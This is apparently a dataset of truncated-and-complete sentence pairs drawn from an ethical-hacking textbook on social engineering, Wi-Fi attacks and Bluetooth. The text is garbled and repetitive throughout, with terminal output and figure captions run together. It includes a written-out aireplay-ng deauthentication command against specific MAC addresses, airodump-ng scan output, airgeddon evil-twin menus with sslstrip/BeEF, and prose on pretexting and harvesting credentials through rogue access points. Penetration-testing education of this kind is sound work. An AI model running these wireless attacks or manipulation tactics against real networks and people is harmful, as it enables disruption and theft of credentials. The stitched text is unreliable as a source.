0 launch stack buffer overflow 21 ) adobe reader u3d memory corruption vulnerability 22 ) mscomctl activex,0 launch stack buffer overflow 21 ) adobe reader u3d memory corruption vulnerability 22 ) mscomctl activex buffer overflow ( ms12-027 ) the file format tells us how we are going to exploit the system
this will let us run arbitrary code on the remote system ;,this will let us run arbitrary code on the remote system ; we just need to determine what that arbitrary code is going to be
"if we select the first file format type in the list , we","if we select the first file format type in the list , we get a list of payloads where the default is a meterpreter memory injection"
this payload provides a meterpreter shell being sent back to,"this payload provides a meterpreter shell being sent back to us , as long as we have a handler set up"
phishing can be a very reliable attack vector when it comes,"phishing can be a very reliable attack vector when it comes to social engineering , but it ’ s not the only one"
"while there are plenty of other ways to perform social engineering attacks , this is a very powerful","while there are plenty of other ways to perform social engineering attacks , this is a very powerful tool that leverages the pay-loads and other functionality of the metasploit framework to make your life a lot easier"
summary social engineering is a skill that has been around for probably,summary social engineering is a skill that has been around for probably as long as there have been humans who have wants and desires
"once you know the principles of social engineering , you","once you know the principles of social engineering , you can start to recognize places where you are being manipulated"
"the principles of social engineering are reciprocity , commitment","the principles of social engineering are reciprocity , commitment , social proof , authority , liking , and scarcity"
these key principles can be used to manipulate people into,these key principles can be used to manipulate people into performing acts they may not other-wise be inclined to perform
"you are being told a story , and it ’ s a story you","you are being told a story , and it ’ s a story you are inclined to buy into , likely because of the promise of millions of dollars"
"who , after all , wouldn ’ t like to have enough money that they could quit their job and","who , after all , wouldn ’ t like to have enough money that they could quit their job and go live on a beach in tahiti ? pretexting is just the story you are going to tell your targets"
a good pretext has all the angles covered so you aren ’ t,a good pretext has all the angles covered so you aren ’ t fumbling for an answer when your target asks a question or raises an objection
"this can require research , especially if you are going after employees within an organization","this can require research , especially if you are going after employees within an organization who may have been given training to protect themselves and the company against social engineering attacks"
"vishing is trying to gather information over the phone ; phishing is the process of gathering information through fraud , though commonly it ’","vishing is trying to gather information over the phone ; phishing is the process of gathering information through fraud , though commonly it ’ s thought to include email as the delivery means ; smishing is using text messages ; and imper-sonation is pretending to be someone else"
"while some of the forms of social engineering will include impersonation as a component , when we talk about impersonation as a","while some of the forms of social engineering will include impersonation as a component , when we talk about impersonation as a social engineering vector , we ’ re talking about impersonating someone else in order to gain physi-cal access to a building or facility"
gaining physical access to a facility may be an,gaining physical access to a facility may be an important element in a penetration test or red-team effort
many buildings today are protected by requiring a badge swipe to demonstrate that you,many buildings today are protected by requiring a badge swipe to demonstrate that you are who you say you are and that you have legitimate access to the building
"a man trap can protect against this sort of entrance , as can","a man trap can protect against this sort of entrance , as can a revolving door that only makes a quarter turn for a swiped badge"
it ’ s trivial to set up a clone of an existing website,it ’ s trivial to set up a clone of an existing website by just copying all of the resources from that site to another location
"once there , you can add additional components , including “ malicious","once there , you can add additional components , including “ malicious ” software , which may give you remote access to the target system"
"you can use typosquatting attacks , using a domain name that is very similar","you can use typosquatting attacks , using a domain name that is very similar to a real domain name with a common typo as part of the name"
"you can also use watering hole attacks , which is where a commonly visited","you can also use watering hole attacks , which is where a commonly visited site is compromised so when users come to the site , they may get infected"
"wireless network access is common today , especially with so","wireless network access is common today , especially with so many devices that can ’ t support wired network access"
you can set up a rogue access point with an,you can set up a rogue access point with an enticing name to get people to con-nect and give up information
this means legitimate users can be forced to attempt authentication against your access point and you can gather credentials or,"this means legitimate users can be forced to attempt authentication against your access point and you can gather credentials or any other information , since once they are connected , all of their traffic will be passing through your system"
you get a phone call from someone telling you they are from the irs and they are,you get a phone call from someone telling you they are from the irs and they are sending the police to your house now to arrest you unless you provide a method of payment imme-diately
which of the social engineering principles is in use when you see a line of people at,which of the social engineering principles is in use when you see a line of people at a ven- dor booth at a security conference waiting to grab free usb sticks and cds ? a
what statistic are you more likely to be concerned,what statistic are you more likely to be concerned about when thinking about implement- ing biometrics ? a
which of these forms of biometrics is least likely to give a,which of these forms of biometrics is least likely to give a high true accept rate while mini- mizing false reject rates ? a
what is the web page you may be presented with when connecting,"what is the web page you may be presented with when connecting to a wireless access point , especially in a public place ? a"
"wireless networks are ubiquitous , especially as devices that have no","wireless networks are ubiquitous , especially as devices that have no ability to take in a traditional wired connection become more predominant"
"the problem with wireless networks , though , is","the problem with wireless networks , though , is that they use radio waves as the transmis-sion medium"
the signal strength isn ’ t nearly the same as an am or,the signal strength isn ’ t nearly the same as an am or fm signal you would pick up with a radio you would listen to
a signal is sent from a transmitter through the air and a,"a signal is sent from a transmitter through the air and a receiver gets the signal , as long as the receiver is within range"
"because they are just radio signals , they can","because they are just radio signals , they can be intercepted if you are within range of the transmitter"
"even without misconfigurations , there are enough issues in","even without misconfigurations , there are enough issues in the protocols themselves to open up the possibility of compromise"
"using at least one of them , you may be able to","using at least one of them , you may be able to get into systems and networks as long as you have physical proximity"
wi-fi is actu-ally a trademark of the wi-fi alliance,wi-fi is actu-ally a trademark of the wi-fi alliance and is used for devices that have passed certification tests
"however , wi-fi has been through several versions since its introduction , and","however , wi-fi has been through several versions since its introduction , and substantial changes to how wi-fi operates have been made in some of those versions"
the physical layer specifies the modulation schemes used to,the physical layer specifies the modulation schemes used to transmit the data and also specifies the fre-quency spectrum used
devices like microwaves and some cordless phones operate within the same frequency spectrum as bluetooth,"devices like microwaves and some cordless phones operate within the same frequency spectrum as bluetooth devices and wi-fi , making it a little crowded and leading to the potential for conflict"
"this causes issues , of course , since older radios in wi-fi interfaces won","this causes issues , of course , since older radios in wi-fi interfaces won ’ t work on anything other than the frequency they have been tuned to"
"instead of being limited to 54 mbits per second , it was","instead of being limited to 54 mbits per second , it was possible to get speeds up to 600 mbits per second using 802"
"if your access point supported mimo but your card did not , you would still be limited to the lower bandwidths because","if your access point supported mimo but your card did not , you would still be limited to the lower bandwidths because your card was not capable of doing anything better than a single channel at 54 mbits per second , at a maximum"
"a channel is a bounded range of frequencies , much","a channel is a bounded range of frequencies , much like channels on a tv or a particular radio station"
each of those is allocated a range of frequencies on,"each of those is allocated a range of frequencies on which to transmit , depending on the amount of bandwidth needed"
this is dependent on the regulatory body,this is dependent on the regulatory body that manages the frequency spectrum for electromagnetic transmissions
"11 that supports transmission in the 5 ghz range , there are other","11 that supports transmission in the 5 ghz range , there are other channels that are available , though that also varies from one country to another"
there is less consistency regarding the use of the 5,there is less consistency regarding the use of the 5 ghz range around the world than there is with the 2
"in terms of capturing signal without actually being in the building , how far from the build-ing you need to","in terms of capturing signal without actually being in the building , how far from the build-ing you need to be will depend on how close the nearest access point is to an external wall and how many windows there are"
"beyond that , you need to be concerned","beyond that , you need to be concerned with how the wi-fi network handles authentication and encryption"
this is especially true in cases where companies allow employ-,this is especially true in cases where companies allow employ- ees to attach their own devices to the corporate network
we can talk about topology here because it ’ s technically relevant,"we can talk about topology here because it ’ s technically relevant , though it may be harder to conceptualize than with wired networks"
"the first type of network , and one that is less common","the first type of network , and one that is less common , especially in a business environment , is an ad hoc network"
"in an ad hoc network , all the devices have to be within range of each","in an ad hoc network , all the devices have to be within range of each other because there is nothing else in place to for-ward messages to other devices at a distance"
"while ad hoc networks are easy to set up and they can be fast ,","while ad hoc networks are easy to set up and they can be fast , managing them is very difficult , and they are certainly not suitable for an enterprise environment"
the difference between a switch and an access,the difference between a switch and an access point is that the switch controls the electrical signal
an access point has no control over whether systems see,an access point has no control over whether systems see the traffic or not because everything is in the air
"this means wireshark gets everything down to the radio headers ,","this means wireshark gets everything down to the radio headers , which is the layer 1/2 set of headers for the frame"
"as that ’ s the case , wireshark shouldn ’ t be seeing anything , and if monitor mode","as that ’ s the case , wireshark shouldn ’ t be seeing anything , and if monitor mode was turned off , even with promiscuous mode on , there wouldn ’ t be anything in the capture"
they have to be because there is no electrical connection,they have to be because there is no electrical connection that tells a system there is a network in place
"once monitor mode is on , though , you can","once monitor mode is on , though , you can see the mes-sages between the access point and the clients"
"if you pull up a list of the wireless networks in the area , you","if you pull up a list of the wireless networks in the area , you may see your operating system , indicating that it is looking for networks in the area"
"for that to happen , your system will send","for that to happen , your system will send out probe requests to identify wireless networks in the area"
your client is looking for a service set identifier (,"your client is looking for a service set identifier ( ssid ) , which is essentially the name of your network"
"there may be multiple access points in a network that carry the same ssid , though , since you may have","there may be multiple access points in a network that carry the same ssid , though , since you may have a large facility and the signal from a single access point isn ’ t enough to carry through all of it"
to distinguish from one access point to another when they are using the,"to distinguish from one access point to another when they are using the same ssid , there is a base service set identifier ( bssid )"
this looks like a mac address and provides a way for,"this looks like a mac address and provides a way for a client to communicate with a specific access point , as needed"
4 multiple bssids for a single ssid the process for getting your client,4 multiple bssids for a single ssid the process for getting your client connected to the access point requires that it authenticate with the access point
this allows for the access point and the station to,this allows for the access point and the station to negotiate the way they are going to communicate going forward
"5 , you can see a diagram of the process that is","5 , you can see a diagram of the process that is required to get the station authenticated and associated with the access point"
5 authentication and association steps authentication request authentication response association request association responseclient/station access point of,"5 authentication and association steps authentication request authentication response association request association responseclient/station access point of course , this is only part of the process required to get a station onto the network"
"wi-fi encryption an initial concern about wireless networks , especially when","wi-fi encryption an initial concern about wireless networks , especially when the technology started to be offered for commercial use , was privacy"
wired networks were considered to be private because in order to see any of the,"wired networks were considered to be private because in order to see any of the transmissions over a wired network , an attacker had to have physical access to the network"
"while this wasn ’ t entirely true , there was","while this wasn ’ t entirely true , there was still a requirement to provide similar privacy to wireless networks"
"the 40-bit key was con-catenated with a 24-bit initialization vector , adding randomization to the pre-shared key (","the 40-bit key was con-catenated with a 24-bit initialization vector , adding randomization to the pre-shared key ( psk ) value to create a 64-bit key for the rivest cipher 4 ( rc4 ) encryption algorithm"
"once encryption restrictions were lifted , vendors could","once encryption restrictions were lifted , vendors could use a 104-bit key provided by the network administrator"
"along with the 24-bit initialization vector , that created a 128-bit key","along with the 24-bit initialization vector , that created a 128-bit key , doubling the key length but exponentially increasing the strength of the key"
"this meant that with enough data , the key","this meant that with enough data , the key could be determined , leading to wep encryption being cracked"
wi-fi protected access ( wpa ) encryption is,wi-fi protected access ( wpa ) encryption is complex and encryption schemes are under constant scrutiny
"improvements in technology , especially computing power , have made cracking encryption","improvements in technology , especially computing power , have made cracking encryption much easier , which generally limits the shelf life of new encryption mechanisms"
"the same key , derived in a different way , could be","the same key , derived in a different way , could be fed into the same rc4 algorithm to perform the encryption of messages"
"this was meant to address one of the issues with wep , where a collection of frames","this was meant to address one of the issues with wep , where a collection of frames could yield enough data to derive the key because of the weakness in the initialization vector algorithm"
"instead , wpa implemented a message integrity check ( mic )","instead , wpa implemented a message integrity check ( mic ) , which is sometimes called a message authentication code ( mac )"
"the second mode of authentication , called wpa-enterprise","the second mode of authentication , called wpa-enterprise , uses the extensible authentication protocol ( eap )"
"as an example , you can use wpa-enterprise with your existing","as an example , you can use wpa-enterprise with your existing enterprise user database and authentication scheme , such as windows active directory"
it is used to handle key distribution so the users of,it is used to handle key distribution so the users of the client devices don ’ t know what the key is
the key is stored with the endpoint and is used,the key is stored with the endpoint and is used to communicate with the access point when devices come online
wi-fi protected access 2 ( wpa2 ) wi-fi protected access 2,wi-fi protected access 2 ( wpa2 ) wi-fi protected access 2 ( wpa2 ) is a standard that was ratified as ieee 802
"there have been several other amendments , including ones that provide the","there have been several other amendments , including ones that provide the capability to handle mimo streams as well as different channels and bandwidths"
some of the problems with wep continued with the use of,"some of the problems with wep continued with the use of wpa , since wpa continued to use the rc4 stream cipher"
"the first is the pairwise master key ( pmk ) , which","the first is the pairwise master key ( pmk ) , which is retained over time so it has to be protected and not transmitted"
there is also a group temporal key ( gtk ) that comes out of the handshake ; it is,"there is also a group temporal key ( gtk ) that comes out of the handshake ; it is used for broadcast or multicast traffic , meaning it ’ s a key that is shared across multiple devices"
"the access point sends its nonce to the station , along with a key replay counter","the access point sends its nonce to the station , along with a key replay counter , which is used to match mes-sages that are sent so any replayed messages can get discarded"
"the station generates its own nonce and sends it to the access point ,","the station generates its own nonce and sends it to the access point , along with the key replay counter that matches the one sent by the access point"
"the station also sends a message integrity code ( mic , a message authentication","the station also sends a message integrity code ( mic , a message authentication code ) to ensure there is no tampering with the message that is sent"
6 four-way handshake for wpa2 sta sta constructs the ptk ap constructs the ptkanonce snonce + mic gtk +,"6 four-way handshake for wpa2 sta sta constructs the ptk ap constructs the ptkanonce snonce + mic gtk + mic ackap once the access point has the station ’ s nonce , it can derive its own ptk"
"the four-way handshake com-pletes authentication , since you have to have","the four-way handshake com-pletes authentication , since you have to have the right keys in order to be able to complete the handshake"
"just as with wpa , there is personal and enterprise authentication available , and","just as with wpa , there is personal and enterprise authentication available , and the handshake process is the same , no matter which method of authentication is available"
"1x to handle user-level authentication , meaning someone connecting to","1x to handle user-level authentication , meaning someone connecting to the network has to pro - vide a username and password"
the authentication framework used is the extensible authentication protocol,the authentication framework used is the extensible authentication protocol ( eap ) and the different variations of eap
a couple of common variations are the lightweight extensible authentication protocol,a couple of common variations are the lightweight extensible authentication protocol ( leap ) and the protected extensible authentication protocol ( peap )
"these frameworks , along with others , like eap-tls , are used to ensure that the authentica","these frameworks , along with others , like eap-tls , are used to ensure that the authentica - tion is done over a protected channel so any authentication parameters are not sent in the clear"
7 wireless configuration under linux bring your own device ( byod ) you probably have at least,"7 wireless configuration under linux bring your own device ( byod ) you probably have at least one mobile device , whether it ’ s a smartphone , a tablet , or a laptop"
"because of the prevalence of these devices and their ease of use , people","because of the prevalence of these devices and their ease of use , people carry them around and have at least smart-phones with them nearly all the time"
"companies often want to take advantage of these computing resources , so they may","companies often want to take advantage of these computing resources , so they may have policies around how to allow people to use their own devices on enterprise networks"
"a company that allows personal devices on their network , generally through wireless networks because mobile","a company that allows personal devices on their network , generally through wireless networks because mobile devices generally don ’ t have wired connections , may be open to any device connecting"
this means they may not have a form of network access control (,this means they may not have a form of network access control ( nac ) that can restrict which devices can talk to their wireless networks
they can do this by blocking mac addresses in order to prevent anyone,they can do this by blocking mac addresses in order to prevent anyone not on the white list from even get-ting to the point of user-level authentication
"as seen earlier , wpa2 with enterprise authen-tication","as seen earlier , wpa2 with enterprise authen-tication also provides protection by requiring that users authenticate"
it ’ s common for businesses to put wi-fi clients into an,it ’ s common for businesses to put wi-fi clients into an isolated network that behaves as though it ’ s outside the enterprise
"they connect to a password-protected wi-fi network using wpa2-enterprise authentication and encryption , and then","they connect to a password-protected wi-fi network using wpa2-enterprise authentication and encryption , and then they have to further authenti-cate to get a tunnel open to the inside of the network"
"this means even if you get access to the employee wi-fi network , typically separate from the guest","this means even if you get access to the employee wi-fi network , typically separate from the guest wi-fi network that may also be available , you still won ’ t have easy access to business assets"
"companies who have embraced byod , however , may","companies who have embraced byod , however , may have made it easier to gain access to their resources"
"of course , byod isn ’ t the only way employees can get access to cor-porate resources over wi-fi , but if byod is enabled ,","of course , byod isn ’ t the only way employees can get access to cor-porate resources over wi-fi , but if byod is enabled , it likely means there aren ’ t restric-tions about devices that can connect , preventing someone from even being able to provide authentication credentials to get access"
"there is also a key reinstallation attack , sometimes called krack , which can be","there is also a key reinstallation attack , sometimes called krack , which can be used to force endpoints to send messages in a way that attackers can decrypt them easily"
"sniffing as noted earlier , wireshark can be used","sniffing as noted earlier , wireshark can be used to capture network traffic that includes the radio headers"
you will want to see all the bea-cons from the access points,you will want to see all the bea-cons from the access points and any authentication messages that may be sent between sta-tions and access points
"in the following code listing , you can see the use","in the following code listing , you can see the use of airmon-ng to create a monitor interface from a wireless interface"
rt5372 ( mac80211 monitor mode vif enabled for [ phy0 ] wlan0 on [ phy0 ] wlan0mon ) (,rt5372 ( mac80211 monitor mode vif enabled for [ phy0 ] wlan0 on [ phy0 ] wlan0mon ) ( mac80211 station mode vif disabled for [ phy0 ] wlan0 ) you ’ ll notice some warnings at the start
"airmon-ng needs to be able to make changes to the network interfaces , meaning","airmon-ng needs to be able to make changes to the network interfaces , meaning it ’ s better if the processes managing the interfaces aren ’ t running"
"while this example is running under linux , aircrack-ng does have","while this example is running under linux , aircrack-ng does have a windows package and the same programs can be used there"
"once the monitor interface has been created , you","once the monitor interface has been created , you can use it as you would any other network interface"
"in the following list-ing , you can see the use of","in the following list-ing , you can see the use of tcpdump using the interface wlan0mon , which was created by airmon-ng"
using tcdump with a monitor interface root @ quiche : ~ # tcpdump -i wlan0mon tcpdump : verbose,"using tcdump with a monitor interface root @ quiche : ~ # tcpdump -i wlan0mon tcpdump : verbose output suppressed , use -v or -vv for full protocol decodelistening on wlan0mon , link-type ieee802_11_radio ( 802"
0 mb/s 2457 mhz 11b -43dbm signal antenna 1 clear-to-send,0 mb/s 2457 mhz 11b -43dbm signal antenna 1 clear-to-send ra:64:1c : b0:94 : ba:57 ( oui unknown ) 20:49:21
0 mb/s 2457 mhz 11b -19dbm signal antenna 1 acknowledgment,0 mb/s 2457 mhz 11b -19dbm signal antenna 1 acknowledgment ra:64:1c : b0:94 : ba:57 ( oui unknown ) 20:49:21
0 mb/s 2457 mhz 11b -43dbm signal antenna 1 clear-to-send,0 mb/s 2457 mhz 11b -43dbm signal antenna 1 clear-to-send ra:64:1c : b0:94 : ba:57 ( oui unknown ) 20:49:23
0 mb/s 2457 mhz 11b -67dbm signal antenna 1 acknowledgment ra :,0 mb/s 2457 mhz 11b -67dbm signal antenna 1 acknowledgment ra : ec : aa : a0:4d:31 : a8 ( oui unknown ) 20:49:23
0 mb/s 2457 mhz 11b -65dbm signal antenna 1 acknowledgment ra :,0 mb/s 2457 mhz 11b -65dbm signal antenna 1 acknowledgment ra : f6 : aa : a0:4d:31 : a8 ( oui unknown ) 20:49:23
0 mb/s 2457 mhz 11b -43dbm signal antenna 1 clear-to-send,0 mb/s 2457 mhz 11b -43dbm signal antenna 1 clear-to-send ra:64:1c : b0:94 : ba:57 ( oui unknown ) 20:49:24
0 mb/s 2457 mhz 11b -51dbm signal antenna 1 acknowledgment ra:18,0 mb/s 2457 mhz 11b -51dbm signal antenna 1 acknowledgment ra:18 : d6 : c7:7d : ee:11 ( oui unknown ) 20:49:24
0 mb/s 2457 mhz 11b -51dbm signal antenna 1 acknowledgment ra:70:3a : cb:52 : ab : fc ( oui,"0 mb/s 2457 mhz 11b -51dbm signal antenna 1 acknowledgment ra:70:3a : cb:52 : ab : fc ( oui unknown ) from the tcpdump output , you can see all of the radio traffic , including signal informa- tion"
"for example , there is a garage door opener","for example , there is a garage door opener that has wireless capabilities trying to find the net-work wifimyqgdo"
"11 plus radiotap header ) , capture size 262144 bytes ^c125 packets captured126 packets received by filter0 packets dropped","11 plus radiotap header ) , capture size 262144 bytes ^c125 packets captured126 packets received by filter0 packets dropped by kernel once you have a saved packet capture , you can open it in a program like wireshark"
"here you can not only see the ssid , you can","here you can not only see the ssid , you can also see some of the capabilities being requested by the station"
the vendor id for the send- ing device is chamberlain group,"the vendor id for the send- ing device is chamberlain group , which is the company that owns liftmaster garage door openers"
this suggests that there is an expec-tation that the wireless device,this suggests that there is an expec-tation that the wireless device knows about broadcom capabilities and expects to commu-nicate using some of them
8 probe request in wireshark wireshark can also provide additional details about,8 probe request in wireshark wireshark can also provide additional details about the wireless connection that you were not able to see in tcpdump
"in theory , the signal strength can give you an","in theory , the signal strength can give you an indication of the proximity of the radio you are looking at"
this does assume that all radios and antennas are roughly,"this does assume that all radios and antennas are roughly equivalent , meaning signal strength would be a function of distance"
"in practice , however , there are a lot of","in practice , however , there are a lot of other fac-tors , including any materials the signal is passing through"
one of the challenges with this is that you are going to miss,one of the challenges with this is that you are going to miss data unless you know the channel of the wireless network you want to sniff
"if you are just trying to generally gather data , you may be","if you are just trying to generally gather data , you may be able to frequency- or channel-hop if your card ’ s driver supports that"
"when you channel-hop , though , you are moving from","when you channel-hop , though , you are moving from one channel to another , listening on each new channel"
this means it ’ s best to do some scanning ahead of time,this means it ’ s best to do some scanning ahead of time to identify which channel the network you really care about listening is on
9 radio headers in wireshark deauthentication attack a deauthentication attack,9 radio headers in wireshark deauthentication attack a deauthentication attack sends messages that force stations to reauthenticate against the access point
"as discussed , the interface needs to be on the right","as discussed , the interface needs to be on the right channel to know what fre - quency to send messages on"
"in the follow - ing code , you can see setting the","in the follow - ing code , you can see setting the correct channel for the access point and then running a deauthentication attack"
deauthentication attack root @ quiche : ~ # sudo iwconfig wlan0mon channel 6 root @ quiche : ~ # aireplay-ng -0 10 -a c4 : ea:1d :,deauthentication attack root @ quiche : ~ # sudo iwconfig wlan0mon channel 6 root @ quiche : ~ # aireplay-ng -0 10 -a c4 : ea:1d : d3:78:39 -c 64:52:99:50:48:94 wlan0mon18:22:59 waiting for beacon frame ( bssid : c4 : ea:1d : d3:78:39 ) on channel 618:23:00 sending 64 directed deauth ( code 7 )
you can also run deauthentications against all stations by omitting,"you can also run deauthentications against all stations by omitting the -c parameter , which is the client mac address"
"to get some additional details to run this attack , you","to get some additional details to run this attack , you can use airodump-ng , another program in the aircrack-ng suite of programs"
"this gives you the bssid , the power level , the","this gives you the bssid , the power level , the number of beacons , the channel number , and other details"
"using airodump-ng to acquire information ch 6 ] [ elapsed : 6 mins ] [ 2018-12-16 18:22 bssid pwr beacons # data , # /s ch mb enc cipher auth essid 18 : d6 : c7:7d : ee:11 -21 309 955 0 11 195 wpa2 ccmp psk casachien c4 : ea:1d : d3:78:39 -36 218","using airodump-ng to acquire information ch 6 ] [ elapsed : 6 mins ] [ 2018-12-16 18:22 bssid pwr beacons # data , # /s ch mb enc cipher auth essid 18 : d6 : c7:7d : ee:11 -21 309 955 0 11 195 wpa2 ccmp psk casachien c4 : ea:1d : d3:78:39 -36 218 16 0 6 130 wpa2 ccmp psk centurylink5191 70:3a : cb:52 : ab : fc -40 211 0 0 11 130 wpa2 ccmp psk casachien 70:3a : cb:15 : f5 : a1 -41 139 121 0 1 130 wpa2 ccmp psk casachien fa:8f : ca:6c:2d:6d -42 160 0 0 11 130 opn master bedroom tv"
m 70:3a : cb:4a:41:3b -44 211 156 0 6 130 wpa2 ccmp psk casachien 92 : cd : b6:13 : fe:3c -55 196 0 0 6 65 opn hp-setup > 3c-m277 laserjet,m 70:3a : cb:4a:41:3b -44 211 156 0 6 130 wpa2 ccmp psk casachien 92 : cd : b6:13 : fe:3c -55 196 0 0 6 65 opn hp-setup > 3c-m277 laserjet 70:8b : cd : cd:92:30 -65 164 17 0 11 195 wpa2 ccmp psk hide_yo_kids_hide_yo_wifi ec : aa : a0:4d:31 : a8 -67 0 0 0 9 195 wpa2 ccmp psk home-c377-2
"since the essid isn ’ t being broadcast , you can","since the essid isn ’ t being broadcast , you can ’ t retrieve it from an announcement from the access point"
"if you force the client into an unauthenticated state , that station will need to","if you force the client into an unauthenticated state , that station will need to reauthenticate , which will allow you to capture the essid from the cli-ent when it reassociates"
this was because of a weakness in the calculation of the,"this was because of a weakness in the calculation of the initialization vector , a random number used to seed the key"
evil twin an evil twin is a rogue access point configured to look,"evil twin an evil twin is a rogue access point configured to look just like a legitimate access point , meaning it advertises a known ssid"
you could also potentially capture unencrypted web,"you could also potentially capture unencrypted web traffic , which may include usernames and passwords"
"however , better would be to gather information from the stations","however , better would be to gather information from the stations , such as authentication information or , as needed , a psk"
"ideally , you would have an intelligent means of interacting","ideally , you would have an intelligent means of interacting with the stations and col - lecting information they may have"
there are a few programs you can use that will make life a,there are a few programs you can use that will make life a lot easier for you if you want to use an evil twin attack
"one program is wifiphisher , which can be used to impersonate a wireless network while","one program is wifiphisher , which can be used to impersonate a wireless network while jamming a legitimate access point , then redirecting traffic to a site managed by you"
this means you don ’ t have to worry about any encryption issues,"this means you don ’ t have to worry about any encryption issues , if you want to pretend to be a commonly visited web - site"
this is a program that will work on linux dis-,this is a program that will work on linux dis- tributions and can be used for several types of wireless attacks
"in the code listing that fol- lows , you can see the initial menu , after it has tested","in the code listing that fol- lows , you can see the initial menu , after it has tested your system for compatibility as well as the existence of all of the tools and libraries the program will need"
"just creating an evil twin access point is a good start , but if you","just creating an evil twin access point is a good start , but if you use that attack , you will need to bring in other tools to capture data"
this also allows you to use the browser exploitation,this also allows you to use the browser exploitation framework ( beef ) to exploit vulnerabilities in browsers
4ghz selected bssid : none selected channel : none selected essid :,4ghz selected bssid : none selected channel : none selected essid : none select an option from menu : -- -- -- -- - 0
explore for targets ( monitor mode needed ) -- -- -- -- -- -- -- --,"explore for targets ( monitor mode needed ) -- -- -- -- -- -- -- -- ( without sniffing , just ap ) -- -- -- -- -- -- -- -- - 5"
evil twin attack just ap -- -- -- -- -- -- -- -- -- -- --,evil twin attack just ap -- -- -- -- -- -- -- -- -- -- -- ( with sniffing ) -- -- -- -- -- -- -- -- -- -- -- - 6
evil twin ap attack with sniffing and bettercap-sslstrip2/beef -- -- -- -- -- -- -,"evil twin ap attack with sniffing and bettercap-sslstrip2/beef -- -- -- -- -- -- - ( without sniffing , captive portal ) -- -- -- -- -- -- - 9"
evil twin ap attack with captive portal ( monitor mode needed ) -- -- -- -- -,evil twin ap attack with captive portal ( monitor mode needed ) -- -- -- -- - one thing to note here is that airgeddon requires two wireless interfaces to perform an evil twin attack
"it needs this second interface for dos pursuit mode , which","it needs this second interface for dos pursuit mode , which prevents the frequency hopping that can be a protection against wireless attacks"
the second interface is also used to perform a,the second interface is also used to perform a denial of service attack against the legitimate access point
"under the hood , it is using a collection of tools that you need to already have","under the hood , it is using a collection of tools that you need to already have in place , like hostapd , a dhcp server , dnsspoof , and a lightweight http server"
all you need to do is run airgeddon rather than having to set up several tools,"all you need to do is run airgeddon rather than having to set up several tools and get all the parameters right with them running in the correct order , as needed"
"key reinstallation so far , you may have gotten the impression that wireless networks that are","key reinstallation so far , you may have gotten the impression that wireless networks that are using wpa2 are invulnerable to attack , short of pretending to be the legitimate wireless network"
"when a station goes through a four-way handshake , one of the","when a station goes through a four-way handshake , one of the outcomes is a session key that gets used for encryption and decryption"
it ’ s called a session key because it ’ s used for,it ’ s called a session key because it ’ s used for the dura-tion of the session while the station is connected to the access point
"since session keys are derived rather than known ahead of time , if an attacker can","since session keys are derived rather than known ahead of time , if an attacker can force the use of a known value during key derivation , the key can be known"
the four-way handshake is used to allow the station and the access point to derive a,"the four-way handshake is used to allow the station and the access point to derive a key based on a random value , or nonce , that is passed between the two ends"
"in the third mes-sage of the handshake , the client has","in the third mes-sage of the handshake , the client has what it needs to install the key used for the session"
"since messages can get lost , especially as stations get farther from","since messages can get lost , especially as stations get farther from the access point , that third message can be retransmitted multiple times"
"any modern wireless network , whether they are using wpa or wpa2","any modern wireless network , whether they are using wpa or wpa2 , enterprise or personal , may be vulnerable to this sort of attack"
"as of this writing , there are not a lot of tools","as of this writing , there are not a lot of tools available to automate the exploitation of this key reinstallation attack ( krack )"
"more than that , any two devices that would commonly","more than that , any two devices that would commonly communicate over a wire may use a wireless protocol , bluetooth"
bluetooth is a wireless protocol allowing for,bluetooth is a wireless protocol allowing for short-range communication between one device and another
while a class a bluetooth device has a range of about 100 meters due to a higher strength signal,"while a class a bluetooth device has a range of about 100 meters due to a higher strength signal , most bluetooth devices have a range of about 10 meters , requiring close proximity to interact with them"
each bluetooth device will implement a set of,"each bluetooth device will implement a set of profiles , depending on the requirements for the device"
this is not the only profile a headset would,"this is not the only profile a headset would implement , so each bluetooth device may implement several profiles"
"when two devices are paired , they share their capabilities","when two devices are paired , they share their capabilities , meaning they tell each other what profiles they support"
"pairing requires verification , so each device should provide a means of","pairing requires verification , so each device should provide a means of indicating it expects to and wants to pair with the other device"
"early devices used a simple four-digit number ( pin ) , which needed","early devices used a simple four-digit number ( pin ) , which needed to be pro-vided to indicate that the device requesting to pair knew the value"
"devices that had limited input capabilities , like a","devices that had limited input capabilities , like a headset or earpiece , would have a value hard-coded"
there were four mech - anisms to complete a pairing request with,"there were four mech - anisms to complete a pairing request with this version , outside of the compatibility required to support older devices"
the first was called just works because the pairing was supposed,the first was called just works because the pairing was supposed to just work without any interaction on the part of the user
"if the two values match , the user can indicate that to","if the two values match , the user can indicate that to be the case and the two endpoints can complete the pairing process"
"in some cases , a peripheral may only be able to provide input","in some cases , a peripheral may only be able to provide input but not output , such as , for example , a bluetooth keyboard"
"when you pair that with your computer , your computer","when you pair that with your computer , your computer may prompt you to enter a value on the keyboard"
"once the two devices are close , you can use an app","once the two devices are close , you can use an app on the smartphone or tablet to complete the pairing and setup process"
"keep in mind that no matter what you do , you need","keep in mind that no matter what you do , you need to be within close proximity of the device you want to attack"
"scanning before we go too far down the road of attacks ,","scanning before we go too far down the road of attacks , we should go over how you would determine where potential victims may be"
you could just go through the process of adding,you could just go through the process of adding a bluetooth device and your system will scan for devices
"whereas an inquiry scan has the receiver listening for inquiry , a brute","whereas an inquiry scan has the receiver listening for inquiry , a brute force scan actively sends messages to devices in order to determine what they are"
"to run this scan , you need to tell btscanner the starting address and","to run this scan , you need to tell btscanner the starting address and the ending address you want to scan , which you can see being asked for"
"keep in mind that each octet has 256 values , so the more octets","keep in mind that each octet has 256 values , so the more octets of the address you want to run through , the longer your scan will take"
btscanner starting a brute force scan ┌────────────────────────────────────────────────┐ │ │ │start address │ │,btscanner starting a brute force scan ┌────────────────────────────────────────────────┐ │ │ │start address │ │ │ │ │ ││ └────────────────────────────┘ ││ ││ ││ ││ ││ ││ │├────────────────────────────────────────────────────────────────────────────────────┤│ ││btscanner 2
"0 ││keys : h=help , i=inquiry scan , b=brute force scan , a=abort scan , s=save summary","0 ││keys : h=help , i=inquiry scan , b=brute force scan , a=abort scan , s=save summary , o=se││lect sort , enter=select , q=quit │ this type of scanning will get you lists of devices"
just having the list of devices nearby may be enough,just having the list of devices nearby may be enough to run some of the attacks commonly used against bluetooth devices
bluejacking bluejacking is when an attacker sends data to a bluetooth device without having to get,"bluejacking bluejacking is when an attacker sends data to a bluetooth device without having to get through the pairing process , or perhaps the pairing happens without the receiver knowing about it"
"this could be a spoof attack , where you send a message that appears","this could be a spoof attack , where you send a message that appears to be from someone else in order to get the recipient to do something"
